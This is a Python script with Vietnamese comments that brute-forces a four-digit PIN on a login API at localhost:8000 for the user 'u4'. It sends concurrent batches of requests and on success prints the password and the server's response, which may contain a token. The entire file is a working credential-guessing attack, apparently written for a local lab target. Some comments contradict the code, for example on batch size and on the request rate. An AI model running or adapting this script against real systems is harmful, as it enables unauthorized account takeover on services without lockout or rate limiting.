import asyncio
import aiohttp
import time

API_URL = "http://localhost:8000/login"
USERNAME = "u4"
CONCURRENCY_LIMIT = 20  # Giới hạn số kết nối đồng thời để bảo vệ server
BATCH_SIZE = 100        # Chia nhỏ mỗi đợt quét 500 số

found_password = None
error_count = 0
start_time = 0  # Dùng để tính thời gian ngay khi tìm thấy pass

async def attempt_login(session, semaphore, pin):
    global found_password, error_count
    
    if found_password:
        return

    password_attempt = f"{pin:04d}"
    payload = {"username": USERNAME, "password": password_attempt}

    try:
        async with semaphore:
            async with session.post(API_URL, json=payload, timeout=5) as response:
                if response.status == 200:
                    found_password = password_attempt
                    time_elapsed = round(time.time() - start_time, 2)
                    
                    # Cố gắng đọc nội dung server trả về (ví dụ: JSON chứa token)
                    try:
                        resp_text = await response.text()
                    except:
                        resp_text = "Không thể đọc nội dung"

                    # IN LOG CHI TIẾT KHI TÌM THẤY
                    print("\n" + "🔥"*25)
                    print(f"[+] BÙM! ĐÃ TÌM THẤY MẬT KHẨU!")
                    print(f"    👉 Username  : {USERNAME}")
                    print(f"    👉 Password  : {password_attempt}")
                    print(f"    ⏱️ Thời gian : Mất {time_elapsed} giây")
                    print(f"    🌐 HTTP Code : {response.status}")
                    print(f"    📄 Server nói: {resp_text[:200]}") # Chỉ in 200 ký tự đầu để tránh rác màn hình
                    print("🔥"*25 + "\n")
                    
    except Exception as e:
        error_count += 1
        if error_count <= 3:
            print(f"[-] Lỗi ở mã {password_attempt}: {e}")

async def main():
    global start_time
    print(f"Bắt đầu Brute Force vào {API_URL}...")
    print(f"Cấu hình: Bắn {CONCURRENCY_LIMIT} request/giây, chia đợt {BATCH_SIZE} số.\n")
    
    start_time = time.time()
    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
    connector = aiohttp.TCPConnector(limit=CONCURRENCY_LIMIT)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        # CHIA LÔ ĐỂ LOG CHI TIẾT (từ 0, bước nhảy 500)
        for i in range(0, 10000, BATCH_SIZE):
            if found_password:
                break # Dừng vòng lặp lớn nếu đã tìm thấy
                
            start_pin = i
            end_pin = min(i + BATCH_SIZE - 1, 9999)
            
            # Log ra khoảng đang quét
            print(f"[*] Đang quét vùng mã PIN từ [{start_pin:04d}] đến [{end_pin:04d}]...")
            
            # Tạo task cho lô hiện tại
            tasks = [attempt_login(session, semaphore, pin) for pin in range(start_pin, end_pin + 1)]
            
            # Đợi lô hiện tại chạy xong rồi mới chạy lô tiếp theo
            await asyncio.gather(*tasks)

    # Kết luận cuối cùng
    if not found_password:
        print(f"\n[-] Đã quét sạch 10.000 trường hợp nhưng không trúng.")
        if error_count > 0:
            print(f"[-] Cảnh báo: Có {error_count} request bị lỗi kết nối.")
        print(f"[+] Tổng thời gian: {round(time.time() - start_time, 2)} giây")

if __name__ == "__main__":
    asyncio.run(main())